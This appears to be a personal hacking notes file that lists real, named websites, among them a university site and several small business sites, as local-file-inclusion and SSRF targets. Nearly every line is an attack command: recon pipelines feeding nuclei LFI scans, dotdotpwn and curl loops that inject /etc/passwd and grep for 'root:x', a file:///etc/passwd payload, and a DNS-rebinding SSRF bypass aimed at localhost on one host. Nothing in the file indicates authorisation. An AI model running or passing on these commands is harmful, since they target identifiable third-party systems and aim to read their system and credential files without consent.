                                                 LFI Vulnerable Targets 

 1) subfinder -d ravagedband.com | httpx-toolkit | gau | uro | gf lfi | tee ravagedband.txt

    nuclei -list ravagedband.txt -tags lfi
 
 2)  echo 'https://arc.iram.fr/' | gau | uro | gf lfi

     nuclei -target 'https://arc.iram.fr/home.php?page=about.php' -tags lfi

 3)  http://lars-seeberg.com 
 
     nuclei -target 'http://lars-seeberg.com ' -tags lfi 

 4)  https://mylocal.life/index.php?page=contact.php
 
     nuclei -target 'https://mylocal.life/index.php?page=contact.php' -tags lfi 

     dotdotpwn -m http-url -d 10 -f /etc/passwd -u "https://mylocal.life/index.php/pandora_console/ajax.php?page=TRAVERSAL" -b -k "root:"

     subfinder -d mylocal.life | httpx-toolkit | gau | uro | gf lfi | qsreplace "/etc/passwd" | while read url ; do curl -silent "$url" | grep "root:x" && echo "$url is vulnerable" ; done; 

5)   echo 'http://santosranch.com/?page=contact.php' | qsreplace "/etc/passwd" | while read url ; do curl -silent "$url" | grep "root:x" && echo "$url is vulnerable" ; done; 
  
     nuclei -target 'http://santosranch.com/?page=contact.php' -tags lfi 

6)   echo "https://sksc.somaiya.edu" | waybackurls | gf redirect
      
     https://sksc.somaiya.edu/download.php?pdf_path=https%3A%2F%2Fdharma-studies.s3.ap-south-1.amazonaws.com%2FCSJ-Syllabi%2F28_CSJ_M.A.%2BJainology%2Band%2BPrakrit_July%2BAC_260820.pdf
  
  
     https://sksc.somaiya.edu/download.php?pdf_path=file:///etc/passwd 
                                    


        SSRF bypass By DNS rebinding

USING FOLLOWING LINK

     http://lock.cmpxchg8b.com/rebinder.html
     https://sksc.somaiya.edu/download.php?pdf_path=http://7f000001.a3468a23.rbndr.us

                             
Vuln wordpresss site 

https://thefutureafrica.com/



    
